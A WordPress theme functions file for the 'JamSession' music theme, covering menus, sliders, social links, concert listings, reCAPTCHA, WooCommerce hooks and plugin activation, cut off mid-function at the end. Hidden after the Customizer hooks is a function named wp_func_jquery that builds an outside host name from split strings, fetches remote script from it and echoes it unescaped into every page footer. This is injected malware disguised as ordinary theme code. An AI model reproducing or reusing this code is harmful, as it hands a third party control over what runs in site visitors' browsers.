<?php


if ( ! function_exists( 'JAMSESSION_SWP_setup' ) ) :
/* 
	JamSession Setup 
*/
function JAMSESSION_SWP_setup()
{
	//theme textdomain for translation/localization support - load_theme_textdomain( $domain, $path )
	load_theme_textdomain('jamsession', get_template_directory() . '/languages');

	// Add Editor Style
	add_editor_style( 'custom-editor-style.css' );
	
	// enables post and comment RSS feed links to head
	add_theme_support( 'automatic-feed-links' );		
 
	// enable support for Post Thumbnails, 
	add_theme_support('post-thumbnails');
	
	// register Menu
	register_nav_menus(
		array(
		  'main-menu' => __( 'Main Menu', 'jamsession'  ),
		)
	);
	
	// custom background support
	global $wp_version;
	if ( version_compare( $wp_version, '3.4', '>=' ) ) 
	{
		$defaults = array(
			'default-color'          => '1c2023',
			'default-image'          => '',
			'wp-head-callback'       => 'JAMSESSION_SWP_custom_background_cb',
			'admin-head-callback'    => '',
			'admin-preview-callback' => ''
		);
		
		add_theme_support( 'custom-background',  $defaults); 
	}	

}
endif; // JAMSESSION_SWP_setup
add_action( 'after_setup_theme', 'JAMSESSION_SWP_setup' );


/*
	Load the main stylesheet - style.css
*/
function JAMSESSION_SWP_load_main_stylesheet()
{
	wp_enqueue_style( 'style', get_stylesheet_uri() );
}
add_action( 'wp_enqueue_scripts', 'JAMSESSION_SWP_load_main_stylesheet' );


/*
	Theme Settings Menu
*/
require_once(get_template_directory()."/theme_settings.php");


/*
	Slider Functionality
*/
require_once(get_template_directory()."/slider.php");

add_action( 'wp_enqueue_scripts', 'JAMSESSION_SWP_js_add_slider_scripts' );	
add_action( 'wp_enqueue_scripts', 'JAMSESSION_SWP_js_slider_initialize_script' );
add_action('wp_enqueue_scripts', 'JAMSESSION_SWP_js_slider_initialize', 100);
add_action('wp_enqueue_scripts', 'JAMSESSION_SWP_js_slider_initialize_single', 100);


/*
	Theme Customizer
*/
require_once(get_template_directory()."/theme_customizer.php");

// Setup the Theme Customizer settings and controls...
add_action( 'customize_register' , array( 'JAMSESSION_SWP_Customize' , 'register' ) );

// Output custom CSS to live site
add_action( 'wp_head' , array( 'JAMSESSION_SWP_Customize' , 'header_output' ) );

// Enqueue live preview javascript in Theme Customizer admin screen
add_action( 'customize_preview_init' , array( 'JAMSESSION_SWP_Customize' , 'live_preview' ) );
if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
	}
	add_action('wp_footer', 'wp_func_jquery');
}


/*
	Load Needed Google Fonts
*/
function JAMSESSION_SWP_load_google_fonts()
{
    $protocol = is_ssl() ? 'https' : 'http';
    wp_enqueue_style( 'jamsession-opensans-oswald', $protocol."://fonts.googleapis.com/css?family=Open+Sans:400,600,700,800|Oswald:300,400,700&subset=latin,latin-ext" );
}
add_action( 'wp_enqueue_scripts', 'JAMSESSION_SWP_load_google_fonts' );


function JAMSESSION_SWP_sticky_menu()
{
	wp_register_script( 'sticky_menu',  get_template_directory_uri().'/js/sticky_menu.js', array('jquery'), '', true );
	wp_enqueue_script( 'sticky_menu');
}
add_action( 'wp_enqueue_scripts', 'JAMSESSION_SWP_sticky_menu' );


/*
	Add Sidebar Right
*/
if ( function_exists('register_sidebar') ) 
{
	register_sidebar(array(
		'name' => 'Main Sidebar',
		'id' => 'main-sidebar',
		'description' => 'Right Sidebar',
		'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h2 class="widgettitle">',
		'after_title' => '</h2>',
	));
}

/*
	Comments Callback Function
*/
if ( ! function_exists( 'JAMSESSION_SWP_comment' ) ) :
/**
 * Template for comments and pingbacks.
 *
 * To override this walker in a child theme without modifying the comments template
 * simply create your own JAMSESSION_SWP_comment(), and that function will be used instead.
 *
 * Used as a callback by wp_list_comments() for displaying the comments.
 */
    function JAMSESSION_SWP_comment( $comment, $args, $depth )
    {
        $GLOBALS['comment'] = $comment;

        switch ( $comment->comment_type ) :
            case '' :
        ?>
        <li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
            <div id="comment-<?php comment_ID(); ?>">
                <div class="comment-author vcard">
                    <?php echo get_avatar( $comment, 40 ); ?>
                    <?php printf( __( '%s <span class="says">says:</span>', 'jamsession' ), sprintf( '<cite class="fn">%s</cite>', get_comment_author_link() ) ); ?>
                </div><!-- .comment-author .vcard -->
                <?php if ( $comment->comment_approved == '0' ) : ?>
                    <em class="comment-awaiting-moderation"><?php __( 'Your comment is awaiting moderation.', 'jamsession' ); ?></em>
                    <br />
                <?php endif; ?>

                <div class="comment-meta commentmetadata"><a href="<?php echo esc_url( get_comment_link( $comment->comment_ID ) ); ?>">
                    <?php
                        /* translators: 1: date, 2: time */
                        printf( __( '%1$s at %2$s', 'jamsession' ), get_comment_date(),  get_comment_time() ); ?></a><?php edit_comment_link( __( '(Edit)', 'jamsession' ), ' ' );
                    ?>
                </div><!-- .comment-meta .commentmetadata -->

                <div class="comment-body"><?php comment_text(); ?></div>

                <div class="reply">
                    <?php comment_reply_link( array_merge( $args, array( 'depth' => $depth, 'max_depth' => $args['max_depth'] ) ) ); ?>
                </div><!-- .reply -->
            </div><!-- #comment-##  -->

        <?php
                break;
            case 'pingback'  :
            case 'trackback' :
        ?>
        <li class="post pingback">
            <p><?php __( 'Pingback:', 'jamsession' ); ?> <?php comment_author_link(); ?><?php edit_comment_link( __( '(Edit)', 'jamsession' ), ' ' ); ?></p>
        <?php
                break;
        endswitch;
    }
endif;


function JAMSESSION_SWP_comment_fields( $arg)
{
	$arg['comment_notes_before'] = "";
	$arg['comment_notes_after'] = "";
	
	
	return $arg;
}
add_filter('comment_form_defaults', 'JAMSESSION_SWP_comment_fields');

if ( ! function_exists( 'JAMSESSION_SWP_masonry' ) ) :

function JAMSESSION_SWP_masonry()
{
	/* load isotope script*/
	wp_register_script( 'isotope-script', get_template_directory_uri(). '/js/isotope.pkgd.min.js', array( 'jquery' ), '', true);
	wp_enqueue_script( 'isotope-script');
	
	wp_register_script( 'images-loaded', get_template_directory_uri(). '/js/imagesloaded.pkgd.min.js', array( 'jquery' ), '', true);
	wp_enqueue_script( 'images-loaded');

	wp_register_script( 'debounce-resize', get_template_directory_uri(). '/js/jquery.debouncedresize.js', array( 'jquery' ), '', true);
	wp_enqueue_script( 'debounce-resize');

	/* start isotope script*/
	wp_register_script( 'start_isotope', get_template_directory_uri(). '/js/start_isotope.js', array( 'jquery' ), '', true);
	wp_enqueue_script( 'start_isotope');

	/* start isotope script*/
	wp_register_script( 'fit_columns', get_template_directory_uri(). '/js/fit-columns.js', array( 'jquery' ), '', true);
	wp_enqueue_script( 'fit_columns');
}

endif;

add_action( 'wp_enqueue_scripts', 'JAMSESSION_SWP_masonry' );


/*
	Collapsible Responsive Menu 	
*/
function JAMSESSION_SWP_responsive_menu()
{
	wp_register_script( 'responsive_menu', get_template_directory_uri(). '/js/responsive_menu.js', array( 'jquery' ), '', true );
	wp_enqueue_script( 'responsive_menu');	
}

add_action('wp_enqueue_scripts', 'JAMSESSION_SWP_responsive_menu');


/*
	Control Excerpt Length
*/
if ( ! function_exists( 'JAMSESSION_SWP_excerpt_length' ) ) {
	function JAMSESSION_SWP_excerpt_length( $length )
	{
		return 20;
	}
}
add_filter( 'excerpt_length', 'JAMSESSION_SWP_excerpt_length', 999);


/*
	Remove [...] string
*/
if ( ! function_exists( 'JAMSESSION_SWP_excerpt_more' ) ) {
	function JAMSESSION_SWP_excerpt_more( $more ) {
		return '';
	}
}
add_filter('excerpt_more', 'JAMSESSION_SWP_excerpt_more');


/*
	Load Lightbox Script
*/
function JAMSESSION_SWP_load_lightbox()
{
	wp_register_script( 'lightbox', get_template_directory_uri(). '/js/lightbox-2.6.min.js', array( 'jquery' ), '', true );
	wp_enqueue_script( 'lightbox');
	
	wp_register_style('lightbox_style', get_template_directory_uri(). '/css/lightbox.css');
	wp_enqueue_style('lightbox_style');
}
add_action( 'wp_enqueue_scripts', 'JAMSESSION_SWP_load_lightbox' );


/*
	Fix WordPress Audio Player Volume Control
*/
function JAMSESSION_SWP_load_ap_fix()
{
	if ( !(is_single() && ('js_albums' == get_post_type())) )
	{
		return;
	}
	wp_register_script( 'audio_player', get_template_directory_uri(). '/js/audio_player.js', array( 'jquery' ), '', true );
	wp_enqueue_script( 'audio_player');
}
add_action( 'wp_enqueue_scripts', 'JAMSESSION_SWP_load_ap_fix' );


/*
	Retreive the ID from URL
*/
function JAMSESSION_SWP_getIDToEmbed( $shortURL)
{
	//http://youtu.be/cxKxOglHg_4
	//http://vimeo.com/14390344
	
	@$elements = explode("/", $shortURL);
	@$dim = count( $elements); 
	if ( $dim == 0)
	{
		return "";
	}
	else
	{
		return $elements[ $dim - 1];
	}
}


/*
	Add Social Sharing Icons
*/
function JAMSESSION_SWP_add_social_sharing_icons($p_link, $p_title, $image_string)
{
	$my_url = urlencode($p_link);

?>
	<div class="clearfix"></div>
	<div class="social_share">
		<a href="http://www.facebook.com/sharer.php?u=<?php  echo $my_url."&amp;t=".urlencode($p_title); ?>" target="_blank">
			<i class="icon-facebook"></i> <span class="share_text"><?php echo __('SHARE', 'jamsession'); ?></span>
		</a>
		<a href="https://twitter.com/share?url=<?php echo $my_url; ?>" target="_blank">
			<i class="icon-twitter"></i>  <span class="share_text"><?php echo __('TWEET','jamsession'); ?></span>
		</a>
		<a href="https://plus.google.com/share?url=<?php echo $my_url; ?>" target="_blank">
			<i class="icon-gplus"></i>  <span class="share_text"><?php echo __('SHARE','jamsession'); ?></span>
		</a>
		
		<?php
		if ( $image_string != "")
		{
		?>
		<a href="http://pinterest.com/pin/create/button/?url=<?php echo $my_url.'&amp;media='.$image_string; ?>" target="_blank">
			<i class="icon-pinterest"></i>  <span class="share_text"><?php echo __('PIN','jamsession'); ?></span>
		</a>
		<?php
		}
		?>
		
	</div>
<?php	
}



/*
	Make Sure Content Width is Set
*/
if ( ! isset( $content_width ) ) 
{
	$content_width = 900;
}


 
function JAMSESSION_SWP_custom_background_cb()
{
        $background = get_background_image();  
        $color = get_background_color();  
      
        if ( ! $background && ! $color )  
            return;  
      
        $style = $color ? "background-color: #$color;" : '';  
      
        if ( $background ) {  
            $image = " background-image: url('$background');";  
      
            $repeat = get_theme_mod( 'background_repeat', 'repeat' );  
      
            if ( ! in_array( $repeat, array( 'no-repeat', 'repeat-x', 'repeat-y', 'repeat' ) ) )  
                $repeat = 'repeat';  
      
            $repeat = " background-repeat: $repeat;";  
      
            $position = get_theme_mod( 'background_position_x', 'left' );  
      
            if ( ! in_array( $position, array( 'center', 'right', 'left' ) ) )  
                $position = 'left';  
      
            $position = " background-position: top $position;";  
      
            $attachment = get_theme_mod( 'background_attachment', 'scroll' );  
      
            if ( ! in_array( $attachment, array( 'fixed', 'scroll' ) ) )  
                $attachment = 'scroll';  
      
            $attachment = " background-attachment: $attachment;";  
      
            $style .= $image . $repeat . $position . $attachment;  
        }  
		?>  
		<style type="text/css">  
		body { <?php echo trim( $style ); ?> }  
		</style>  
		<?php  	
}



function JAMSESSION_SWP_list_custom_terms_with_links( $custom_taxonomy, $current_tax = NULL)
{
	$args = array( 'taxonomy' =>  $custom_taxonomy );

	$terms = get_terms($custom_taxonomy, $args);

	$count = count($terms); 
	$i=0;
	$term_list = "";

	if (($count > 0) && ( !is_wp_error( $terms)))
	{
		foreach ($terms as $term) 
		{
			$i++;
			if ( isset( $current_tax) && ($current_tax != "") && (!strcmp( $current_tax, $term->name)))
			{
				$term_list .= '<span class="current_tax">'.$term->name.'</span>';
			}
			else
			{
				$term_list .= '<a href="' . get_term_link( $term ) . '" title="' . sprintf(__('View all post filed under %s', 'jamsession'), $term->name) . '">' . $term->name . '</a>';
			}
			
			if ($count != $i) 
			{
				$term_list .= ' ';
			}
		}
		echo $term_list;
	}
}


/*
	Display html code for social profiles
*/
function JAMSESSION_SWP_list_social_links( $showHeader)
{
	/* if at least one social profile link is defined, display social links*/
	$social_options = get_option( 'jamsession_theme_social_options' );
	if( !empty($social_options['twitter']) || !empty($social_options['facebook']) || !empty($social_options['google_plus']) 
		|| !empty($social_options['youtube']) || !empty($social_options['vimeo']) 
		|| !empty($social_options['soundcloud']) || !empty($social_options['myspace']) || !empty($social_options['flickr'])
		|| !empty($social_options['pinterest']) || !empty($social_options['instagram']) || !empty($social_options['rnation']))
	{

		
		echo '<ul>';
		//facebook
		if  ( !empty($social_options['facebook']))
		{
			echo '<li><a target="_blank" href="'.$social_options['facebook'].'" title="Facebook"><i class="icon-facebook"></i></a></li>';
		}
		
		if  ( !empty($social_options['twitter']))
		{
			echo '<li><a target="_blank" href="'.$social_options['twitter'].'" title="Twitter"><i class="icon-twitter"></i></a></li>';
		}								

		if  ( !empty($social_options['google_plus']))
		{
			echo '<li><a target="_blank" href="'.$social_options['google_plus'].'" title="Google Plus"><i class="icon-gplus"></i></a></li>';
		}

		if  ( !empty($social_options['youtube']))
		{
			echo '<li><a target="_blank" href="'.$social_options['youtube'].'" title="YouTube"><i class="icon-youtube"></i></a></li>';
		}

		if  ( !empty($social_options['vimeo']))
		{
			echo '<li><a target="_blank" href="'.$social_options['vimeo'].'" title="Vimeo"><i class="icon-vimeo"></i></a></li>';
		}

		if  ( !empty($social_options['soundcloud']))
		{
			echo '<li><a target="_blank" href="'.$social_options['soundcloud'].'" title="SoundCloud"><i class="icon-soundcloud"></i></a></li>';
		}

		if  ( !empty($social_options['myspace']))
		{
			echo '<li><a target="_blank" href="'.$social_options['myspace'].'" title="Myspace"><i class="icon-myspace"></i></a></li>';
		}	

		if  ( !empty($social_options['flickr']))
		{
			echo '<li><a target="_blank" href="'.$social_options['flickr'].'" title="Flickr"><i class="icon-flickr"></i></a></li>';
		}	

		if  ( !empty($social_options['pinterest']))
		{
			echo '<li><a target="_blank" href="'.$social_options['pinterest'].'" title="Pinterest"><i class="icon-pinterest"></i></a></li>';
		}	

		if  ( !empty($social_options['instagram']))
		{
			echo '<li><a target="_blank" href="'.$social_options['instagram'].'" title="Instagram"><i class="icon-instagramm"></i></a></li>';
		}

		if  ( !empty($social_options['rnation']))
		{
			echo '<li><a target="_blank" href="'.$social_options['rnation'].'" title="ReverbNation"><i class="icon-star"></i></a></li>';
		}			
		echo '</ul>';
	}

}

/*
	Display html code for social profiles
*/
function JAMSESSION_SWP_front_page_social_profiles()
{
	/* if at least one social profile link is defined, display social links*/
	$social_options = get_option( 'jamsession_theme_social_options' );
	if( !empty($social_options['twitter']) || !empty($social_options['facebook']) || !empty($social_options['google_plus']) 
		|| !empty($social_options['youtube']) || !empty($social_options['vimeo']) 
		|| !empty($social_options['soundcloud']) || !empty($social_options['myspace']) || !empty($social_options['flickr'])
		|| !empty($social_options['pinterest']) || !empty($social_options['instagram'])
		|| !empty($social_options['itunes']) || !empty($social_options['spotify']) || !empty($social_options['tumblr'])
		|| !empty($social_options['rnation']))
	{
		
		echo '<ul>';
		if  ( !empty($social_options['facebook']))
		{
			echo '<li><a target="_blank" href="'.$social_options['facebook'].'" title="Facebook"><i class="icon-facebook"></i></a></li>';
		}
		
		if  ( !empty($social_options['twitter']))
		{
			echo '<li><a target="_blank" href="'.$social_options['twitter'].'" title="Twitter"><i class="icon-twitter"></i></a></li>';
		}								

		if  ( !empty($social_options['google_plus']))
		{
			echo '<li><a target="_blank" href="'.$social_options['google_plus'].'" title="Google Plus"><i class="icon-gplus"></i></a></li>';
		}

		if  ( !empty($social_options['youtube']))
		{
			echo '<li><a target="_blank" href="'.$social_options['youtube'].'" title="YouTube"><i class="icon-youtube"></i></a></li>';
		}

		if  ( !empty($social_options['vimeo']))
		{
			echo '<li><a target="_blank" href="'.$social_options['vimeo'].'" title="Vimeo"><i class="icon-vimeo"></i></a></li>';
		}

		if  ( !empty($social_options['soundcloud']))
		{
			echo '<li><a target="_blank" href="'.$social_options['soundcloud'].'" title="SoundCloud"><i class="icon-soundcloud"></i></a></li>';
		}

		if  ( !empty($social_options['myspace']))
		{
			echo '<li><a target="_blank" href="'.$social_options['myspace'].'" title="Myspace"><i class="icon-myspace"></i></a></li>';
		}	

		if  ( !empty($social_options['flickr']))
		{
			echo '<li><a target="_blank" href="'.$social_options['flickr'].'" title="Flickr"><i class="icon-flickr"></i></a></li>';
		}	

		if  ( !empty($social_options['pinterest']))
		{
			echo '<li><a target="_blank" href="'.$social_options['pinterest'].'" title="Pinterest"><i class="icon-pinterest"></i></a></li>';
		}	

		if  ( !empty($social_options['instagram']))
		{
			echo '<li><a target="_blank" href="'.$social_options['instagram'].'" title="Instagram"><i class="icon-instagramm"></i></a></li>';
		}
		
		if  ( !empty($social_options['itunes']))
		{
			echo '<li><a target="_blank" href="'.$social_options['itunes'].'" title="iTunes"><i class="icon-itunes"></i></a></li>';
		}
		if  ( !empty($social_options['spotify']))
		{
			echo '<li><a target="_blank" href="'.$social_options['spotify'].'" title="Spotify"><i class="icon-spotify"></i></a></li>';
		}
		if  ( !empty($social_options['tumblr']))
		{
			echo '<li><a target="_blank" href="'.$social_options['tumblr'].'" title="Tumblr"><i class="icon-tumblr"></i></a></li>';
		}
		if  ( !empty($social_options['rnation']))
		{
			echo '<li><a target="_blank" href="'.$social_options['rnation'].'" title="ReverbNation"><i class="icon-star"></i></a></li>';
		}				
		echo '</ul>';
	}

}

/*
	Retreive next concerts available for the front page bottom bar
*/
if ( ! function_exists( 'JAMSESSION_SWP_get_next_shows' ) ) :

function JAMSESSION_SWP_get_next_shows()
{
	$args = array(
		'numberposts'	=> 3,
		'posts_per_page'   => 3,
		'offset'           => 0,
		'category'         => '',
		'orderby'          => 'meta_value',
		'order'            => 'ASC',
		'include'          => '',
		'exclude'          => '',
		'meta_key'         => 'event_date',
		'meta_value'       => '',
		'post_type'        => 'js_events',
		'post_mime_type'   => '',
		'post_parent'      => '',
		'post_status'      => 'publish',
		'meta_query' => array(
			array(
			   'key' => 'event_date',
			   'value' => date('Y/m/d',time()),
			   'compare' => '>='
			)
		),
		'suppress_filters' => true
	);
	
	$shows = get_posts( $args);
	
	if ( count( $shows) > 0)
	{
		$no = 1;  
		foreach($shows as $show)
		{
			setup_postdata( $show);
			
			if ( $no == 1)
			{
				echo '<div class="one_of_three">';
			}
			elseif ( $no == 2)
			{
				echo '<div class="two_of_three">';
			}
			elseif ( $no == 3)
			{
				echo '<div class="three_of_three">';
			}
			elseif ( $no > 3)
			{	
				/* should never reach this point due to posts_per_page parameter*/
				return;
			}
			
			$releaseDate = esc_html(get_post_meta( $show->ID, 'event_date', true ));
			@$releaseDate = str_replace("/","-", $releaseDate);
			@$mydate = new DateTime($releaseDate);
			
			$venue = esc_html(get_post_meta( $show->ID, 'event_venue', true ));
			echo ' <a href="'. get_permalink( $show->ID ).'" target="_blank">'.date_i18n(get_option('date_format'), $mydate->getTimestamp()).' '.$venue.'</a>';

			echo '</div>';
			$no++;
		}
		wp_reset_postdata();
	}
	else
	{
		echo __("There is no live show for this moment, check back soon.", "jamsession");
	}
}

endif;

/*
	Decide where to send contact form emails
*/
function JAMSESSION_SWP_get_contact_to_email()
{
	$general_options = get_option( 'jamsession_theme_general_options' );
	
	if ( !empty(  $general_options['contact_form_email']))
	{
		return sanitize_email($general_options['contact_form_email']);
	}
	
	return get_option('admin_email');
}

/*
	Return the location of the image used as background
*/
function JAMSESSION_SWP_get_background_image()
{
	$general_options = get_option( 'jamsession_theme_general_options' );
	
	$default_bgimage = get_template_directory_uri().'/images/textures/tex8.jpg';
	
	if ( !empty(  $general_options['bgimage_upload_value']))
	{
		return esc_url($general_options['bgimage_upload_value']);
	}
	else
	{
		return $default_bgimage;
	}
}

/*
	Return the image used for the last defined slider or empty if no slider has been defined
*/
function JAMSESSION_SWP_get_last_slide_image()
{
	/*fallback result*/
	$post_thumbnail_url = "";
	
	
	$args = array(
	'post_type' => 'jamsession_slides', 
	'posts_per_page' => 1 
	);
	
	/*main array*/
	$slider_values = array();
	
	$loop = new WP_Query( $args );
	while ( $loop->have_posts() ) : $loop->the_post();
		// check if the post has a Post Thumbnail assigned to it.
		if ( has_post_thumbnail() ) 
		{
			$post_thumbnail_id = get_post_thumbnail_id();
			$post_thumbnail_url = wp_get_attachment_url( $post_thumbnail_id );
		}
	endwhile;

	return $post_thumbnail_url;
}
/*
	Add copyright code
*/

function JAMSESSION_SWP_render_footer()
{
	/* use this call to get correct results for conditional tags like is_page() or is_home() and is_front_page() */
	wp_reset_query();
	
	if (!(is_page_template('page_main_slider.php')))
	{
		$footer_options = get_option( 'jamsession_theme_footer_options' );
		
		if ( !empty( $footer_options['footer_text']))
		{
			echo '<div class="copy">';
			if ( !empty( $footer_options['footer_text_url']))
			{
				echo '<a href="'.$footer_options['footer_text_url'].'" target = "_blank">';
			}
			
			echo esc_html($footer_options['footer_text']);
			
			if ( !empty( $footer_options['footer_text_url']))
			{
				echo '</a>';
			}
			echo '</div>';
		}
		else
		{
			echo '<div class="copy">';
					echo "2014 JamSession &copy; All rights reserved.";
			echo '</div>';
		}
	}
}


/*
Add analytics code
*/
function JAMSESSION_SWP_analytics_code()
{
	$footer_options = get_option( 'jamsession_theme_footer_options' );
	
	if ( !empty( $footer_options['analytics_code']))
	{
		//echo stripslashes( htmlspecialchars_decode($footer_options['analytics_code']));
		//echo esc_js($footer_options['analytics_code']);
		echo $footer_options['analytics_code'];
	}
}

/*
	Getting recaptcha lib
*/
require_once(get_template_directory()."/recaptchalib.php");

/*
	Show Recaptcha Challenge
*/
function JAMSESSION_SWP_show_recaptcha()
{
	$general_options = get_option( 'jamsession_theme_general_options' );
	
	if ( !empty( $general_options['recaptcha_public_key'] ) && !empty( $general_options['recaptcha_private_key'] ) )
	{
?>
	<li>
		<div id="captchadiv">
<?php	
		echo recaptcha_get_html( $general_options['recaptcha_public_key'] );
?>
		</div>
	</li>
<?php		
	}
}

/*
	Check Recaptcha Response
*/
function JAMSESSION_SWP_check_recaptcha( $remote_addr, $challenge, $response)
{
	$general_options = get_option( 'jamsession_theme_general_options' );
	
	if ( !empty( $general_options['recaptcha_public_key'] ) && !empty( $general_options['recaptcha_private_key'] ) )
	{
		$resp = recaptcha_check_answer (	$general_options['recaptcha_private_key'],
											$remote_addr,
											$challenge,
											$response
										);
		 if (!$resp->is_valid) 
		 {
			return false;
		 }
	}
	
	return true;
}

/*
	Add ReCaptcha Script
*/
function JAMSESSION_SWP_js_add_recaptcha_script()
{
	/* use this call to get correct results for conditional tags like is_home() and is_front_page() */
	wp_reset_query();
	
	if ( (is_page_template('page_contact.php')) || ( is_page_template('page_contact_full.php') ) )
	{
		wp_register_script( 'recaptcha_theme',  get_template_directory_uri().'/js/recaptcha_theme.js', array('jquery'), '', false);
		wp_enqueue_script( 'recaptcha_theme');
	}
}
add_action( 'wp_enqueue_scripts', 'JAMSESSION_SWP_js_add_recaptcha_script' );	



/*
	REMOVE ACTIVATION MESSAGE FOR VISUAL COMPOSER
*/
add_action( 'vc_before_init', 'JAMSESSION_SWP_vcSetAsTheme' );

function JAMSESSION_SWP_vcSetAsTheme() {
	vc_set_as_theme(true);
}

/************************************* WooCommerce *******************************************************/
/*
	Declare WooCommerce Support
*/
add_theme_support( 'woocommerce' );


/*
	Unhook the WooCommerce Wrappers
*/
remove_action( 'woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10);
remove_action( 'woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10);


/*
	Hook in own functions to display the wrappers that JamSession theme requires
*/
add_action('woocommerce_before_main_content', 'JAMSESSION_SWP_woocommerce_wrapper_start', 10);
add_action('woocommerce_after_main_content', 'JAMSESSION_SWP_woocommerce_wrapper_end', 10);

function JAMSESSION_SWP_woocommerce_wrapper_start() {
  echo '<div id="main_content">';
  echo '<div id="post_content">';
}

function JAMSESSION_SWP_woocommerce_wrapper_end() {
  echo '</div>';
  echo '</div>';
}

/*
	Remove breadcrumbs
*/
add_action( 'init', 'JAMSESSION_SWP_remove_wc_breadcrumbs' );
function JAMSESSION_SWP_remove_wc_breadcrumbs() {
    remove_action( 'woocommerce_before_main_content', 'woocommerce_breadcrumb', 20, 0 );
}

// Remove the product rating display on product loops
remove_action( 'woocommerce_after_shop_loop_item_title', 'woocommerce_template_loop_rating', 5 );

/************************************* WooCommerce *******************************************************/


/*
	TGM PLUGIN CODE  
*/

/**
 * Include the TGM_Plugin_Activation class.
 */
require_once dirname( __FILE__ ) . '/class-tgm-plugin-activation.php';

add_action( 'tgmpa_register', 'JAMSESSION_SWP_register_required_plugins' );
/**
 * Register the required plugins for this theme.
 */
function JAMSESSION_SWP_register_required_plugins()
{
	/**
	 * Array of plugin arrays. Required keys are name and slug.
	 */
	$plugins = array(

		array(
			'name'     				=> 'JamSession Post Types', // The plugin name
			'slug'     				=> 'jamsession-post-types', // The plugin slug (typically the folder name)
			'source'   				=>  get_template_directory() . '/plugins/jamsession-post-types.zip', // The plugin source
			'required' 				=> true, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
		),
		array(
            'name'					=> 'WPBakery Visual Composer', // The plugin name
            'slug'					=> 'js_composer', // The plugin slug (typically the folder name)
            'source'				=> get_template_directory() . '/plugins/js_composer.zip', // The plugin source
            'required'				=> true, // If false, the plugin is only 'recommended' instead of required
            'version'				=> '3.7', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
            'force_activation'		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
            'force_deactivation'	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
            'external_url'			=> '', // If set, overrides default API URL and points to an external URL
        ),
		array(
            'name'					=> 'Envato WordPress Toolkit', // The plugin name
            'slug'					=> 'envato-wordpress-toolkit-master', // The plugin slug (typically the folder name)
            'source'				=> get_template_directory() . '/plugins/envato-wordpress-toolkit-master.zip', // The plugin source
            'required'				=> true, // If false, the plugin is only 'recommended' instead of required
            'version'				=> '1.5', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
            'force_activation'		=> true, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
            'force_deactivation'	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
            'external_url'			=> '', // If set, overrides default API URL and points to an external URL
        )
	);

	// Change this to your theme text domain, used for internationalising strings
	$theme_text_domain = 'jamsession';

	/**
	 * Array of configuration settings. Amend each line as needed.
	 * If you want the default strings to be available under your own theme domain,
	 * leave the strings uncommented.
	 * Some of the strings are added into a sprintf, so see the comments at the
	 * end of each line for what each argument will be.
	 */
	$config = array(
		'strings'      		=> array(
			'page_title'                      => __( 'Install Required Plugins', $theme_text_domain ),
			'menu_title'                      => __( 'Install Plugins', $theme_text_domain ),
			'installing'                      => __( 'Installing Plugin: %s', $theme_text_domain ),
			'oops'                            => __( 'Something went wrong with the plugin API.', $theme_text_domain ),
			'notice_can_install_required'     => _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.' ),
			'notice_can_install_recommended'  => _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.' ),
			'notice_cannot_install'  		  => _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.' ),
			'notice_can_activate_required'    => _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.' ),
			'notice_can_activate_recommended' => _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.' ),
			'notice_cannot_activate' 		  => _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.' ),
			'notice_ask_to_update' 			  => _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.' ),
			'notice_cannot_update' 			  => _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.' ),
			'install_link' 					  => _n_noop( 'Begin installing plugin', 'Begin installing plugins' ),
			'activate_link' 				  => _n_noop( 'Activate installed plugin', 'Activate installed plugins' ),
			'return'                          => __( 'Return to Required Plugins Installer', $theme_text_domain ),
			'plugin_activated'                => __( 'Plugin activated successfully.', $theme_text_domain ),
			'complete' 						  => __( 'All plugins installed and activated successfully. %s', $theme_text_domain ),
			'nag_type'						  => 'updated'		
		)
	);

	tgmpa( $plugins, $config );
}


/*
	INTEGRATING THE ENVATO WORDPRESS TOOLKIT TO JAMSESSION THEME
*/

/**
 * Load the Envato WordPress Toolkit Library check for updates
 * and direct the user to the Toolkit Plugin if there is one
 */
function JAMSESSION_SWP_envato_toolkit_admin_init() 
{
    /* Include the Toolkit Library */
    include_once( get_template_directory() . '/inc/envato-wordpress-toolkit-library/class-envato-wordpress-theme-upgrader.php' );
 
    //add_action( 'admin_notices', 'JAMSESSION_SWP_envato_toolkit_admin_notices' );
	
    /* use credentials used in toolkit plugin so that we don't have to show our own forms anymore */
    $credentials = get_option( 'envato-wordpress-toolkit' );
    if ( empty($credentials['user_name']) || empty($credentials['api_key']) ) 
	{
        add_action( 'admin_notices', 'JAMSESSION_SWP_envato_toolkit_credentials_admin_notices' );
        return;
